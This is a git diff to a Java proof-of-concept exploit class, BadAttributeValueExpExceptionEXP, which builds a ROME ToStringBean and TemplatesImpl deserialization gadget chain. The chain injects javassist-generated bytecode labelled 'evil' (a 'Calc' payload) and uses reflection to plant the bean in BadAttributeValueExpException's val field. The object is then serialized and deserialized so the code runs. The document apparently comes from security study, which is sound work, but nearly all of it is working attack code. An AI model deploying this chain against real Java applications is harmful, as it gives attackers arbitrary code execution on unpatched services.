@@ -7,8 +7,10 @@ import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
+import org.apache.commons.collections4.functors.ConstantTransformer;
 
 import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -24,11 +26,15 @@ public class BadAttributeValueExpExceptionEXP {
         byte[] evil = getTemplatesImpl("Calc");
         byte[][] codes = {evil};
         byteCodesField.set(templates,codes);
-//        templates.newTransformer();
-        ToStringBean toStringBean = new ToStringBean(c,templates);
-//        toStringBean.toString();
-        Class toStringBeanEvil = toStringBean.getClass();
-        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);
+
+        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        Class Bv = Class.forName("javax.management.BadAttributeValueExpException");
+        Field val = Bv.getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(badAttributeValueExpException,toStringBean);
+
         serialize(badAttributeValueExpException);
         unserialize("ser.bin");
     }
